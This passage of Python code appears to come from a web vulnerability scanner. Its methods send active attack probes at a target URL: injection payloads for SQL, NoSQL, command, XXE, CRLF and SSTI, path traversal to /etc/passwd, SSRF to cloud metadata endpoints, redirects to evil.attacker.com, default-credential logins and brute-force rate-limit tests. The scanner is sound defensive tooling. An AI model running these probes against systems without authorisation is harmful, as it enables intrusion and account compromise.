                            "payload": payload,
                            "engine_hint": engine,
                            "expected": expected,
                            "url": test_url,
                        }
                        if indicator not in result.ssti_indicators:
                            result.ssti_indicators.append(indicator)
                            logger.warning(
                                "SSTI confirmed: param=%s engine=%s payload=%r",
                                param_name, engine, payload,
                            )
                        break   # One hit per param is enough
                except Exception:
                    continue
                finally:
                    time.sleep(self.path_scan_delay)

    # ── Open Redirect Detection (v0.5) ────────────────────────────────

    def _test_open_redirect(self, base_url: str, result: WebScanResult) -> None:
        """Test common redirect parameters for open redirect vulnerabilities.

        Injects an external URL (evil.attacker.com) into known redirect params
        and checks if the server issues a Location header pointing to it.
        """
        parsed = urlparse(base_url)
        existing_params = parse_qs(parsed.query)

        for param in REDIRECT_PARAMS[:12]:
            test_params = dict(existing_params)
            test_params[param] = [REDIRECT_TARGET]
            try:
                test_url = parsed._replace(
                    query=urlencode(test_params, doseq=True)
                ).geturl()
                resp = self.session.get(
                    test_url, timeout=self.timeout, allow_redirects=False
                )
                location = resp.headers.get("Location", "")
                if REDIRECT_TARGET in location or "evil.attacker.com" in location:
                    indicator = {
                        "parameter": param,
                        "redirect_to": location,
                        "status_code": resp.status_code,
                        "url": test_url,
                    }
                    if indicator not in result.open_redirect_indicators:
                        result.open_redirect_indicators.append(indicator)
                        logger.warning(
                            "Open Redirect: param=%s location=%s", param, location
                        )
            except Exception:
                continue
            finally:
                time.sleep(self.path_scan_delay)

    # ── Path Traversal / LFI Detection (v0.5) ────────────────────────

    def _test_path_traversal(self, base_url: str, result: WebScanResult) -> None:
        """Test common file/path parameters for directory traversal (LFI).

        Injects ``../../../etc/passwd`` (and variants) into parameters
        commonly used to load files server-side. Looks for /etc/passwd
        content patterns or Windows ini file markers in the response.
        """
        parsed = urlparse(base_url)
        existing_params = parse_qs(parsed.query)

        # Fuzz known file params + any existing params in the URL
        params_to_test = list(existing_params.keys()) + [
            p for p in TRAVERSAL_PARAMS if p not in existing_params
        ]

        for param in params_to_test[:8]:
            for payload in TRAVERSAL_PAYLOADS[:4]:
                test_params = dict(existing_params)
                test_params[param] = [payload]
                try:
                    test_url = parsed._replace(
                        query=urlencode(test_params, doseq=True)
                    ).geturl()
                    resp = self.session.get(test_url, timeout=self.timeout)
                    body = resp.text[:5000]
                    for pattern in TRAVERSAL_SUCCESS:
                        if pattern in body:
                            indicator = {
                                "parameter": param,
                                "payload": payload,
                                "pattern_matched": pattern,
                                "url": test_url,
                            }
                            if indicator not in result.path_traversal_indicators:
                                result.path_traversal_indicators.append(indicator)
                                logger.warning(
                                    "Path Traversal/LFI: param=%s pattern=%r",
                                    param, pattern,
                                )
                            break
                except Exception:
                    continue
                finally:
                    time.sleep(self.path_scan_delay)

    # ── SQLi POST Body Fuzzing (v0.5) ─────────────────────────────────

    def _test_sqli_post(self, base_url: str, result: WebScanResult) -> None:
        """Fuzz common POST form parameters for SQL injection.

        Sends POST requests with SQLi payloads in common form field names
        (username, search, email, etc.) and checks responses for SQL error
        patterns. Complements the GET-based _test_sqli() method.
        """
        for param_name in SQLI_POST_PARAMS[:8]:
            for payload in SQLI_PAYLOADS[:3]:
                try:
                    resp = self.session.post(
                        base_url,
                        data={param_name: payload},
                        timeout=self.timeout,
                    )
                    body_lower = resp.text[:5000].lower()
                    for error_pattern in SQL_ERROR_PATTERNS:
                        if error_pattern in body_lower:
                            indicator = {
                                "method": "POST",
                                "parameter": param_name,
                                "payload": payload,
                                "error_pattern": error_pattern,
                                "url": base_url,
                            }
                            if indicator not in result.sqli_post_indicators:
                                result.sqli_post_indicators.append(indicator)
                                logger.warning(
                                    "SQLi POST indicator: param=%s error=%s",
                                    param_name, error_pattern,
                                )
                            break
                except Exception:
                    continue
                finally:
                    time.sleep(self.path_scan_delay)

    # ── SQLi Blind Time-Based Detection (v0.5) ────────────────────────

    def _test_sqli_blind(self, base_url: str, result: WebScanResult) -> None:
        """Detect time-based blind SQL injection via response delay.

        Sends payloads that cause the database to sleep 5 seconds
        (SLEEP, WAITFOR DELAY, pg_sleep). Flags parameters where
        the response takes >= SQLI_BLIND_THRESHOLD seconds.

        Note: uses a higher timeout (12s) than normal scans.
        """
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)
        if not params:
            params = {"id": ["1"]}

        for param_name in list(params.keys())[:3]:
            for payload in SQLI_BLIND_PAYLOADS[:4]:
                test_params = dict(params)
                test_params[param_name] = [payload]
                try:
                    test_url = parsed._replace(
                        query=urlencode(test_params, doseq=True)
                    ).geturl()
                    start = time.time()
                    self.session.get(test_url, timeout=12)   # extended timeout
                    elapsed = time.time() - start

                    if elapsed >= SQLI_BLIND_THRESHOLD:
                        indicator = {
                            "parameter": param_name,
                            "payload": payload,
                            "elapsed_seconds": round(elapsed, 2),
                            "url": test_url,
                            "note": (
                                f"Response delayed {elapsed:.1f}s — "
                                "possible time-based blind SQLi"
                            ),
                        }
                        if indicator not in result.sqli_blind_indicators:
                            result.sqli_blind_indicators.append(indicator)
                            logger.warning(
                                "Blind SQLi: param=%s elapsed=%.1fs",
                                param_name, elapsed,
                            )
                        break   # One hit per param
                except Exception:
                    continue
                finally:
                    time.sleep(self.path_scan_delay)

    # ── XXE Injection (v0.5.1 — A03) ─────────────────────────────────────────

    def _test_xxe(self, base_url: str, result: WebScanResult) -> None:
        """Test for XML External Entity injection.

        Sends POST requests with XXE payloads (Content-Type: application/xml)
        and checks the response for file content leaked via entity expansion.
        """
        for payload in XXE_PAYLOADS[:2]:
            try:
                resp = self.session.post(
                    base_url,
                    data=payload,
                    headers={"Content-Type": "application/xml"},
                    timeout=self.timeout,
                )
                body = resp.text[:5000]
                for pattern in XXE_SUCCESS_PATTERNS:
                    if pattern in body:
                        indicator = {
                            "payload_type": "XXE",
                            "pattern_matched": pattern,
                            "url": base_url,
                            "note": "XML external entity expansion detected — file read possible",
                        }
                        if indicator not in result.xxe_indicators:
                            result.xxe_indicators.append(indicator)
                            logger.warning("XXE confirmed: pattern=%r on %s", pattern, base_url)
                        break
            except Exception:
                continue
            finally:
                time.sleep(self.path_scan_delay)

    # ── Command Injection (v0.5.1 — A03) ─────────────────────────────────────

    def _test_command_injection(self, base_url: str, result: WebScanResult) -> None:
        """Test URL parameters for OS command injection.

        Injects shell metacharacters (;id, |id, &&id, $(id)) into GET params
        and checks the response for command output patterns (uid=, gid=).
        """
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)
        if not params:
            params = {"cmd": ["test"], "exec": ["test"], "shell": ["test"]}

        for param_name in list(params.keys())[:5]:
            for payload in CMDI_PAYLOADS[:5]:
                test_params = dict(params)
                test_params[param_name] = [payload]
                try:
                    test_url = parsed._replace(
                        query=urlencode(test_params, doseq=True)
                    ).geturl()
                    resp = self.session.get(test_url, timeout=self.timeout)
                    body = resp.text[:3000]
                    for pattern in CMDI_SUCCESS_PATTERNS:
                        if pattern in body:
                            indicator = {
                                "parameter": param_name,
                                "payload": payload,
                                "pattern_matched": pattern,
                                "url": test_url,
                            }
                            if indicator not in result.cmdi_indicators:
                                result.cmdi_indicators.append(indicator)
                                logger.warning(
                                    "Command injection: param=%s pattern=%r",
                                    param_name, pattern,
                                )
                            break
                except Exception:
                    continue
                finally:
                    time.sleep(self.path_scan_delay)

    # ── CRLF Injection (v0.5.1 — A03) ────────────────────────────────────────

    def _test_crlf(self, base_url: str, result: WebScanResult) -> None:
        """Test for CRLF (HTTP response splitting) injection.

        Appends CRLF sequences to URL parameters and checks if the injected
        header (X-RAO-Injected) appears in the HTTP response headers.
        """
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)
        if not params:
            params = {"q": ["test"]}

        for param_name in list(params.keys())[:3]:
            for payload in CRLF_PAYLOADS[:3]:
                test_params = dict(params)
                test_params[param_name] = [payload]
                try:
                    test_url = parsed._replace(
                        query=urlencode(test_params, doseq=True)
                    ).geturl()
                    resp = self.session.get(
                        test_url, timeout=self.timeout, allow_redirects=False
                    )
                    # Check if injected header appears in response
                    if CRLF_MARKER.lower() in str(resp.headers).lower():
                        indicator = {
                            "parameter": param_name,
                            "payload": payload,
                            "url": test_url,
                            "note": "CRLF injection — HTTP response splitting possible",
                        }
                        if indicator not in result.crlf_indicators:
                            result.crlf_indicators.append(indicator)
                            logger.warning("CRLF injection: param=%s", param_name)
                        break
                except Exception:
                    continue
                finally:
                    time.sleep(self.path_scan_delay)

    # ── Dangerous HTTP Methods (v0.5.1 — A01) ────────────────────────────────

    def _test_http_methods(self, base_url: str, result: WebScanResult) -> None:
        """Check for dangerous HTTP methods enabled on the server.

        Tests TRACE (XST), PUT (arbitrary write), DELETE, PATCH.
        A 200/201 response to PUT/DELETE indicates a serious access control failure.
        TRACE returning 200 enables Cross-Site Tracing (XST) attacks.
        """
        for method in DANGEROUS_METHODS:
            try:
                resp = self.session.request(
                    method, base_url, timeout=self.timeout, allow_redirects=False
                )
                if method == "TRACE" and resp.status_code == 200:
                    result.dangerous_methods.append(f"TRACE (XST risk — HTTP {resp.status_code})")
                    logger.warning("TRACE method enabled on %s", base_url)
                elif method in ("PUT", "DELETE", "PATCH") and resp.status_code in (200, 201, 204):
                    result.dangerous_methods.append(
                        f"{method} returned {resp.status_code} — unauthorized write/delete possible"
                    )
                    logger.warning("%s method enabled on %s [%d]", method, base_url, resp.status_code)
                elif method == "OPTIONS":
                    allow = resp.headers.get("Allow", "")
                    for dangerous in ("PUT", "DELETE", "TRACE"):
                        if dangerous in allow and dangerous not in result.dangerous_methods:
                            result.dangerous_methods.append(
                                f"{dangerous} listed in Allow header (OPTIONS)"
                            )
            except Exception:
                continue

    # ── Directory Listing (v0.5.1 — A01) ─────────────────────────────────────

    def _detect_directory_listing(
        self, resp: requests.Response, result: WebScanResult
    ) -> None:
        """Detect directory listing exposure in the HTTP response body."""
        body_lower = resp.text[:3000].lower()
        for pattern in DIRLISTING_PATTERNS:
            if pattern.lower() in body_lower:
                result.directory_listing = True
                logger.warning("Directory listing exposed on %s", result.url)
                break

    # ── Default Credentials (v0.5.1 — A07) ───────────────────────────────────

    def _test_default_credentials(self, base_url: str, result: WebScanResult) -> None:
        """Test common admin paths for default username/password combinations.

        Tries admin:admin, admin:password, root:root etc. on detected login
        pages. A finding here means the application accepted a trivially
        guessable credential pair.
        """
        parsed = urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        for login_path in LOGIN_PATHS[:6]:
            login_url = f"{origin}{login_path}"
            try:
                # Check the login page exists first
                probe = self.session.get(login_url, timeout=self.timeout, allow_redirects=True)
                if probe.status_code not in (200, 301, 302):
                    continue

                # Try each credential pair
                for username, password in DEFAULT_CREDENTIALS[:8]:
                    try:
                        resp = self.session.post(
                            login_url,
                            data={"username": username, "password": password,
                                  "user_login": username, "user_pass": password,
                                  "log": username, "pwd": password},
                            timeout=self.timeout,
                            allow_redirects=True,
                        )
                        body_lower = resp.text[:5000].lower()
                        for success_pattern in LOGIN_SUCCESS_PATTERNS:
                            if success_pattern in body_lower:
                                cred = {
                                    "url": login_url,
                                    "username": username,
                                    "password": password or "(empty)",
                                    "evidence": success_pattern,
                                }
                                if cred not in result.default_creds_found:
                                    result.default_creds_found.append(cred)
                                    logger.warning(
                                        "Default credentials work: %s:%s on %s",
                                        username, password or "(empty)", login_url,
                                    )
                                break
                    except Exception:
                        continue
                    finally:
                        time.sleep(self.path_scan_delay)

            except Exception:
                continue

    # ── Rate Limiting Check (v0.5.1 — A07) ───────────────────────────────────

    def _test_rate_limiting(self, base_url: str, result: WebScanResult) -> None:
        """Check if the login endpoint has rate limiting / brute-force protection.

        Sends 15 rapid POST requests with a wrong password. If all 15 succeed
        (no 429 / no account lockout pattern), rate limiting is absent.
        This indicates the endpoint is vulnerable to credential stuffing.
        """
        parsed = urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        login_url = f"{origin}/login"

        try:
            # Quick probe — skip if no login page
            probe = self.session.get(login_url, timeout=self.timeout)
            if probe.status_code not in (200, 301, 302):
                return
        except Exception:
            return

        blocked_codes = {429, 403, 423}
        lockout_patterns = ["too many", "locked", "blocked", "captcha", "rate limit"]

        attempts_through = 0
        for _ in range(15):
            try:
                resp = self.session.post(
                    login_url,
                    data={"username": "admin", "password": "rao_ratelimit_test_xyz123"},
                    timeout=self.timeout,
                    allow_redirects=False,
                )
                if resp.status_code in blocked_codes:
                    return  # Rate limiting active — all good
                if any(p in resp.text.lower() for p in lockout_patterns):
                    return  # Lockout message — all good
                attempts_through += 1
            except Exception:
                break

        if attempts_through >= 10:
            result.rate_limiting_absent = True
            logger.warning(
                "Rate limiting absent: %d/15 requests passed on %s",
                attempts_through, login_url,
            )

    # ══ v0.5.2 — NEW DETECTIONS ══════════════════════════════════════════════

    # ── A02: Cleartext PII in response ────────────────────────────────────────

    def _detect_cleartext_pii(
        self, resp: requests.Response, result: WebScanResult
    ) -> None:
        """Scan the response body for PII and sensitive data patterns (A02).

        Checks for credit card numbers, SSNs, passwords in JSON, API keys,
        and Bearer tokens embedded in the unencrypted HTTP response body.
        """
        import re
        body = resp.text[:20000]
        for pattern, description in PII_PATTERNS:
            if re.search(pattern, body):
                if description not in result.cleartext_pii:
                    result.cleartext_pii.append(description)
                    logger.warning("Cleartext PII detected: %s", description)

    # ── A02: Token in URL (query string leakage) ─────────────────────────────

    def _check_token_in_url(self, url: str, result: WebScanResult) -> None:
        """Flag sensitive values in the URL query string (A02).

        Credentials and tokens in URLs are logged by proxies, browsers,
        and servers — causing unintended credential exposure.
        """
        parsed = urlparse(url)
        if not parsed.query:
            return
        params = parse_qs(parsed.query)
        for param in params:
            if param.lower() in SENSITIVE_QUERY_PARAMS:
                result.token_in_url.append(
                    f"Sensitive param '{param}' found in URL query string"
                )
                logger.warning("Token/credential in URL: param=%s", param)

    # ── A02: Cache-Control missing ────────────────────────────────────────────

    def _check_cache_control(
        self, resp: requests.Response, result: WebScanResult
    ) -> None:
        """Check that Cache-Control: no-store is set to prevent caching of
        sensitive pages (A02)."""
        cc = resp.headers.get("Cache-Control", "")
        pragma = resp.headers.get("Pragma", "")
        if "no-store" not in cc and "no-cache" not in cc and "no-cache" not in pragma:
            result.cache_control_missing = True

    # ── A02: HTTPS downgrade / mixed content links ────────────────────────────

    def _detect_https_downgrade(
        self, resp: requests.Response, url: str, result: WebScanResult
    ) -> None:
        """Detect HTTP links in an HTTPS page (mixed active/passive content)."""
        import re
        if not url.startswith("https://"):
            return   # Only relevant on HTTPS pages
        body = resp.text[:30000]
        # Find action= and src= with http://
        http_links = re.findall(
            r'(?:action|src|href)\s*=\s*["\']?(http://[^\s"\'<>]+)', body
        )
        for link in http_links[:5]:
            if link not in result.https_downgrade:
                result.https_downgrade.append(link)
                logger.warning("HTTPS page has HTTP resource: %s", link)

    # ── A08: SRI missing on external scripts/styles ───────────────────────────

    def _check_sri_missing(
        self, resp: requests.Response, result: WebScanResult
    ) -> None:
        """Detect external scripts/stylesheets loaded without SRI (A08).

        Subresource Integrity ensures CDN-served files have not been tampered
        with. Missing integrity= on external CDN resources is flagged.
        """
        import re
        body = resp.text[:30000]
        # Find <script src="..."> and <link href="..."> without integrity=
        script_tags = re.findall(r'<script[^>]+src=["\']([^"\']+)["\'][^>]*>', body)
        link_tags = re.findall(r'<link[^>]+href=["\']([^"\']+)["\'][^>]*>', body)

        for tag_url in script_tags + link_tags:
            for cdn_host in KNOWN_CDN_HOSTS:
                if cdn_host in tag_url:
                    # Check if the original tag has integrity=
                    tag_pattern = re.escape(tag_url)
                    tag_match = re.search(
                        rf'<(?:script|link)[^>]+{tag_pattern}[^>]*>', body
                    )
                    if tag_match and "integrity=" not in tag_match.group(0):
                        issue = f"External resource without SRI: {tag_url[:80]}"
                        if issue not in result.sri_missing:
                            result.sri_missing.append(issue)
                            logger.warning("SRI missing: %s", tag_url[:60])
                    break

    # ── A08: Mixed content (HTTP resources on HTTPS page) ─────────────────────

    def _check_mixed_content(
        self, resp: requests.Response, url: str, result: WebScanResult
    ) -> None:
        """Detect active mixed content: scripts/stylesheets loaded over HTTP
        on an HTTPS page (A08 — software/data integrity failure)."""
        import re
        if not url.startswith("https://"):
            return
        body = resp.text[:30000]
        mixed = re.findall(
            r'<(?:script|link|iframe)[^>]+(?:src|href)=["\']?(http://[^\s"\'<>]+)',
            body,
        )
        for item in mixed[:5]:
            if item not in result.mixed_content:
                result.mixed_content.append(item)

    # ── A05/A08: Source map exposure ──────────────────────────────────────────

    def _check_source_maps(self, base_url: str, result: WebScanResult) -> None:
        """Check for exposed JavaScript/CSS source maps (A05 + A08).

        Source maps expose original, unminified source code — allowing
        attackers to reverse-engineer proprietary business logic.
        """
        parsed = urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        for path in SOURCE_MAP_PATHS[:6]:
            try:
                resp = self.session.get(
                    f"{origin}{path}", timeout=self.timeout, allow_redirects=False
                )
                if resp.status_code == 200 and len(resp.content) > 100:
                    issue = f"Source map exposed: {path}"
                    if issue not in result.source_maps_exposed:
                        result.source_maps_exposed.append(issue)
                        logger.warning("Source map exposed: %s", path)
            except Exception:
                continue

    # ── A09: Security.txt check ───────────────────────────────────────────────

    def _check_security_txt(self, base_url: str, result: WebScanResult) -> None:
        """Check for /.well-known/security.txt (A09).

        A missing security.txt means there is no formal channel for
        responsible vulnerability disclosure — an A09 logging failure indicator.
        """
        parsed = urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        try:
            resp = self.session.get(
                f"{origin}/.well-known/security.txt",
                timeout=self.timeout,
                allow_redirects=True,
            )
            result.security_txt_present = resp.status_code == 200 and len(resp.content) > 10
        except Exception:
            result.security_txt_present = False

    # ── A09: Error response correlation ID ───────────────────────────────────

    def _check_error_correlation(
        self, resp: requests.Response, result: WebScanResult
    ) -> None:
        """Check if responses include correlation/trace IDs (A09).

        Without request IDs, security incidents cannot be correlated across
        logs — a critical logging failure. Flag when no correlation header
        is present on non-200 responses.
        """
        if resp.status_code >= 400:
            has_correlation = any(
                h in resp.headers for h in CORRELATION_HEADERS
            )
            if not has_correlation:
                result.error_no_correlation_id = True

    # ── A10: Internal IP disclosure ───────────────────────────────────────────

    def _detect_internal_ip_disclosure(
        self, resp: requests.Response, result: WebScanResult
    ) -> None:
        """Detect private/internal IP addresses in response headers or body (A10)."""
        import re
        all_text = str(resp.headers) + resp.text[:10000]
        for pattern in INTERNAL_IP_PATTERNS:
            matches = re.findall(pattern, all_text)
            for ip in matches:
                note = f"Internal IP disclosed: {ip}"
                if note not in result.internal_ip_disclosed:
                    result.internal_ip_disclosed.append(note)
                    logger.warning("Internal IP in response: %s", ip)

    # ── A10: SSRF parameter detection ────────────────────────────────────────

    def _test_ssrf_params(self, base_url: str, result: WebScanResult) -> None:
        """Test URL and POST parameters for Server-Side Request Forgery (A10).

        Injects cloud metadata URLs (AWS IMDSv1, GCP, DigitalOcean) into
        common URL-accepting parameters and checks if metadata content is
        returned in the response body.
        """
        parsed = urlparse(base_url)
        existing_params = parse_qs(parsed.query)

        for param in SSRF_PARAMS[:10]:
            for ssrf_url in SSRF_PAYLOADS[:3]:
                test_params = dict(existing_params)
                test_params[param] = [ssrf_url]
                try:
                    test_url = parsed._replace(
                        query=urlencode(test_params, doseq=True)
                    ).geturl()
                    resp = self.session.get(test_url, timeout=self.timeout)
                    body = resp.text[:5000]
                    for pattern in SSRF_SUCCESS_PATTERNS:
                        if pattern in body:
                            indicator = {
                                "parameter": param,
                                "ssrf_url": ssrf_url,
                                "pattern_matched": pattern,
                                "url": test_url,
                            }
                            if indicator not in result.ssrf_indicators:
                                result.ssrf_indicators.append(indicator)
                                logger.warning(
                                    "SSRF confirmed: param=%s pattern=%r",
                                    param, pattern,
                                )
                            break
                except Exception:
                    continue
                finally:
                    time.sleep(self.path_scan_delay)

    # ── A01: IDOR — numeric ID enumeration ───────────────────────────────────

    def _test_idor(self, base_url: str, result: WebScanResult) -> None:
        """Test for Insecure Direct Object Reference via numeric ID enumeration (A01).

        Finds numeric segments in the URL path (e.g. /user/42/profile) and
        tests adjacent IDs. If a different ID returns a 200 with different
        content, it indicates IDOR — objects accessible without authorization.
        """
        parsed = urlparse(base_url)
        path_parts = parsed.path.split("/")

        for i, part in enumerate(path_parts):
            if not part.isdigit():
                continue
            original_id = int(part)
            original_resp = self.session.get(base_url, timeout=self.timeout)
            original_len = len(original_resp.content)

            for delta in range(1, IDOR_TEST_DELTA + 1):
                for test_id in (original_id + delta, max(1, original_id - delta)):
                    test_parts = path_parts.copy()
                    test_parts[i] = str(test_id)
                    test_path = "/".join(test_parts)
                    test_url = parsed._replace(path=test_path).geturl()
                    try:
                        resp = self.session.get(
                            test_url, timeout=self.timeout, allow_redirects=True
                        )
                        if resp.status_code == 200:
                            # Content length differs → likely different object
                            if abs(len(resp.content) - original_len) > 50:
                                indicator = {
                                    "original_id": original_id,
                                    "tested_id": test_id,
                                    "url": test_url,
                                    "note": "Different object returned for adjacent ID — possible IDOR",
                                }
                                if indicator not in result.idor_indicators:
                                    result.idor_indicators.append(indicator)
                                    logger.warning(
                                        "IDOR indicator: %s → %s (size diff %d)",
                                        original_id, test_id,
                                        abs(len(resp.content) - original_len),
                                    )
                    except Exception:
                        continue
                    finally:
                        time.sleep(self.path_scan_delay)

    # ── A01: Forceful browsing (admin paths without auth) ────────────────────

    def _check_forceful_browsing(self, base_url: str, result: WebScanResult) -> None:
        """Check if admin/restricted paths return 200 without authentication (A01).

        Probes a subset of known admin paths. If they return 200 (not 401/403),
        the application is missing function-level access control.
        """
        parsed = urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        # Remove auth headers to simulate unauthenticated request
        session_no_auth = self.session.__class__()
        session_no_auth.headers.update(self.session.headers)
        session_no_auth.verify = self.session.verify

        for path in LOGIN_PATHS[:8]:
            test_url = f"{origin}{path}"
            try:
                resp = session_no_auth.get(
                    test_url, timeout=self.timeout, allow_redirects=False
                )
                if resp.status_code == 200:
                    body_lower = resp.text[:3000].lower()
                    # Only flag if it looks like admin content, not a login redirect
                    if any(kw in body_lower for kw in ("dashboard", "users", "admin", "manage")):
                        issue = f"Admin path accessible without auth: {path} [HTTP 200]"
                        if issue not in result.forceful_browsing:
                            result.forceful_browsing.append(issue)
                            logger.warning("Forceful browsing: %s returns 200", path)
            except Exception:
                continue

    # ── A03: NoSQL Injection ──────────────────────────────────────────────────

    def _test_nosql_injection(self, base_url: str, result: WebScanResult) -> None:
        """Test for NoSQL injection via JSON POST payloads (A03).

        Sends MongoDB operator payloads ($gt, $ne, $regex) as JSON body
        and checks if the response indicates authentication bypass or data leak.
        """
        for payload in NOSQL_JSON_PAYLOADS[:3]:
            try:
                resp = self.session.post(
                    base_url,
                    data=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=self.timeout,
                )
                body_lower = resp.text[:5000].lower()
                if resp.status_code in (200, 201):
                    # Check for success patterns that suggest auth bypass
                    for pattern in ("token", "dashboard", "welcome", "success"):
                        if pattern in body_lower:
                            indicator = {
                                "payload": payload,
                                "pattern": pattern,
                                "url": base_url,
                                "note": "Possible NoSQL injection — auth bypass pattern detected",
                            }
                            if indicator not in result.nosql_indicators:
                                result.nosql_indicators.append(indicator)
                                logger.warning("NoSQL injection indicator: %s", pattern)
                            break
            except Exception:
                continue
            finally:
                time.sleep(self.path_scan_delay)

    # ── A03/A05: GraphQL introspection ───────────────────────────────────────

    def _test_graphql(self, base_url: str, result: WebScanResult) -> None:
        """Test GraphQL endpoints for enabled introspection (A03 + A05).

        Introspection leaks the entire schema — all types, queries, mutations,
        and fields. This should be disabled in production.
        """
        parsed = urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        graphql_paths = ["/graphql", "/api/graphql", "/graphiql", "/playground"]

        introspection_query = '{"query": "{__schema{types{name kind}}}"}'

        for path in graphql_paths:
            gql_url = f"{origin}{path}"
            try:
                resp = self.session.post(
                    gql_url,
                    data=introspection_query,
                    headers={"Content-Type": "application/json"},
                    timeout=self.timeout,
                )
                if resp.status_code == 200 and "__schema" in resp.text:
                    issue = (
                        f"GraphQL introspection enabled at {path} — "
                        "full schema exposed to unauthenticated users"
                    )
                    if issue not in result.graphql_issues:
                        result.graphql_issues.append(issue)
                        logger.warning("GraphQL introspection exposed: %s", path)
            except Exception:
                continue

    # ── A04: Insecure workflow heuristics ────────────────────────────────────

    def _detect_insecure_workflow(
        self, base_url: str, result: WebScanResult
    ) -> None:
        """Detect insecure design patterns via heuristic param manipulation (A04).

        Tests whether business-logic params (price, quantity, amount) accept
        negative values — a common insecure design flaw allowing price/credit
        manipulation.
        """
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)

        for param in list(params.keys()) + BUSINESS_VALUE_PARAMS[:6]:
            if param not in BUSINESS_VALUE_PARAMS:
                continue
            test_params = dict(params)
            test_params[param] = ["-1"]
            try:
                test_url = parsed._replace(
                    query=urlencode(test_params, doseq=True)
                ).geturl()
                resp = self.session.get(test_url, timeout=self.timeout)
                # If the server accepted -1 without error, flag it
                if resp.status_code in (200, 201):
                    body_lower = resp.text[:3000].lower()
                    error_indicators = ["invalid", "error", "bad request", "negative"]
                    if not any(e in body_lower for e in error_indicators):
                        issue = (
                            f"Business param '{param}' accepted value -1 without error "
                            "(A04 — missing input validation)"
                        )
                        if issue not in result.insecure_workflow:
                            result.insecure_workflow.append(issue)
                            logger.warning("Insecure workflow: %s accepts -1", param)
            except Exception:
                continue
            finally:
                time.sleep(self.path_scan_delay)
